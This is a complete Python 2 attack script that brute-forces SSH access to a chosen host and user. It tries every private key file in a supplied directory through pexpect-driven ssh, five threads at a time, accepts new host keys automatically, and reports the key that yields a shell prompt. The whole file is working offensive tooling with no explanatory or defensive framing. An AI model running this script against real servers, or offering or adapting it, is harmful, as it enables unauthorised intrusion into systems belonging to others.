#!/usr/bin/env python

import pexpect
import optparse
import os
from threading import *

TIMED_OUT = 0
SUCCESS_MIN = 1
SUCCESS_MAX = 1
KEYFILE_FAILED = 2
NEW_HOST = 3
CONNECTION_CLOSED = 4

FORCE_KEY_AUTH = ' -o PasswordAuthentication=no'

PERM_DENIED = 'Permission denied'
SSH_NEW_KEY = 'Are you sure you want to continue'
CONN_CLOSED = 'Connection closed by remote host'
POSSIBLE_RESULTS = [
  pexpect.TIMEOUT, '~', PERM_DENIED, SSH_NEW_KEY, CONN_CLOSED
]

MAX_CONNECTIONS = 5
CONNECTION_LOCK = BoundedSemaphore(value = MAX_CONNECTIONS)
stop = False
fails = 0

def connect(user, host, keyfile, release):
  global stop
  global fails
  try:
    conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + FORCE_KEY_AUTH
    child = pexpect.spawn(conn_str)
    ret = child.expect(POSSIBLE_RESULTS)

    if ret == NEW_HOST:
      print '[-] Adding Host to ~/.ssh/known_hosts'
      child.sendline('yes')
      connect(user, host , keyfile, False)
    elif ret == CONNECTION_CLOSED:
      print '[-] Connection Closed By Remote Host'
      fails += 1
    elif ret >= SUCCESS_MIN and ret <= SUCCESS_MAX:
      print '[+] Success. (' + child.before + '). ' + str(keyfile)
      stop = True
    else:
      print '[+] Unable to process result. (' + child.before + ')'
  finally:
    if release:
      CONNECTION_LOCK.release()

def main():
  parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
  parser.add_option('-H', dest = 'tgtHost', type = 'string', help = 'specify target host')
  parser.add_option('-d', dest = 'passDir', type = 'string', help = 'specify directory with keys')
  parser.add_option('-u', dest = 'user', type = 'string', help = 'specify the user')

  (options, args) = parser.parse_args()
  host = options.tgtHost
  passDir = options.passDir
  user = options.user

  if host == None or passDir == None or user == None:
    print parser.usage
    exit(0)

  for filename in os.listdir(passDir):
    if stop:
      print '[*] Exiting: Key found.'
      exit(0)
    if fails > 5:
      print '[!] Exiting: Too Many Connections Closed by Remote Host'
      print '[!] Adjust number of simultaneous threads.'
      exit(0)

    CONNECTION_LOCK.acquire()
    full_path = os.path.join(passDir, filename)
    print '[-] Testing keyfile ' + str(full_path)
    t = Thread(target = connect, args = (user, host, full_path, True))
    child = t.start()

if __name__ == '__main__':
  main()